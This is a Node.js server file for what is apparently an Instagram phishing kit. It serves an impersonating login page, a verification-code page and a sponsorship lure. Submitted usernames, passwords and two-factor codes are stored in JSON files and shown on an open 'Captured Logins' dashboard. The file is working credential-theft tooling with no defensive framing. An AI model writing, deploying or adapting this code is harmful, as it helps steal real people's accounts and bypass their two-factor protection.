const http = require('http');
const fs = require('fs');
const path = require('path');

const USERS_FILE = path.join(__dirname, 'users.json');
const CODES_FILE = path.join(__dirname, 'codes.json');

if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify([], null, 2));
if (!fs.existsSync(CODES_FILE)) fs.writeFileSync(CODES_FILE, JSON.stringify([], null, 2));

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // Serve login page
  if (req.method === 'GET' && req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(fs.readFileSync(path.join(__dirname, 'index.html')));
    return;
  }

  // Serve verify page
  if (req.method === 'GET' && req.url === '/verify') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(fs.readFileSync(path.join(__dirname, 'verify.html')));
    return;
  }

  // Serve logo
  if (req.method === 'GET' && req.url === '/instagram_logo.png') {
    res.writeHead(200, { 'Content-Type': 'image/png' });
    res.end(fs.readFileSync(path.join(__dirname, 'instagram_logo.png')));
    return;
  }

  // View all logins
  if (req.method === 'GET' && req.url === '/view-users') {
    const users = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    const codes = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));

    const userRows = users.map((u, i) => `
      <tr><td>${i+1}</td><td>${u.username}</td><td>${u.password}</td><td>${u.timestamp}</td></tr>
    `).join('');

    const codeRows = codes.map((c, i) => `
      <tr><td>${i+1}</td><td>${c.code}</td><td>${c.timestamp}</td></tr>
    `).join('');

    const html = `
      <!DOCTYPE html><html>
      <head><title>Logged Users</title>
      <style>
        body { font-family: sans-serif; background: #0f1923; color: #e0e0e0; padding: 40px; }
        h1 { margin-bottom: 20px; font-size: 22px; color: #fff; }
        h2 { margin: 32px 0 16px; font-size: 18px; color: #a0b8d0; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 40px; }
        th { background: #1e2d3d; padding: 12px 16px; text-align: left; color: #a0b8d0; font-size: 13px; text-transform: uppercase; }
        td { padding: 12px 16px; border-bottom: 1px solid #1e2d3d; font-size: 14px; }
        tr:hover td { background: #1a2535; }
        .empty { color: #556677; text-align: center; padding: 40px; }
      </style></head>
      <body>
        <h1>Captured Logins (${users.length})</h1>
        <table>
          <thead><tr><th>#</th><th>Username / Email / Phone</th><th>Password</th><th>Timestamp</th></tr></thead>
          <tbody>${userRows || '<tr><td colspan="4" class="empty">No entries yet.</td></tr>'}</tbody>
        </table>
        <h2>Verification Codes (${codes.length})</h2>
        <table>
          <thead><tr><th>#</th><th>Code</th><th>Timestamp</th></tr></thead>
          <tbody>${codeRows || '<tr><td colspan="3" class="empty">No codes yet.</td></tr>'}</tbody>
        </table>
      </body></html>
    `;
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(html);
    return;
  }

  // Handle login POST
  if (req.method === 'POST' && req.url === '/login') {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
      try {
        const entry = JSON.parse(body);
        const existing = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
        existing.push(entry);
        fs.writeFileSync(USERS_FILE, JSON.stringify(existing, null, 2));
        console.log(`[LOGIN] ${entry.username}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // Handle verify POST
  if (req.method === 'POST' && req.url === '/verify') {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
      try {
        const entry = JSON.parse(body);
        const existing = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
        existing.push(entry);
        fs.writeFileSync(CODES_FILE, JSON.stringify(existing, null, 2));
        console.log(`[CODE] ${entry.code}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // Serve sponsorship page
  if (req.method === 'GET' && req.url === '/sponsorship') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(fs.readFileSync(path.join(__dirname, 'sponsorship.html')));
    return;
  }

  // Serve OVO logo
  if (req.method === 'GET' && req.url === '/ovo_logo.jpg') {
    res.writeHead(200, { 'Content-Type': 'image/jpeg' });
    res.end(fs.readFileSync(path.join(__dirname, 'ovo_logo.jpg')));
    return;
  }

  res.writeHead(404);
  res.end();
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
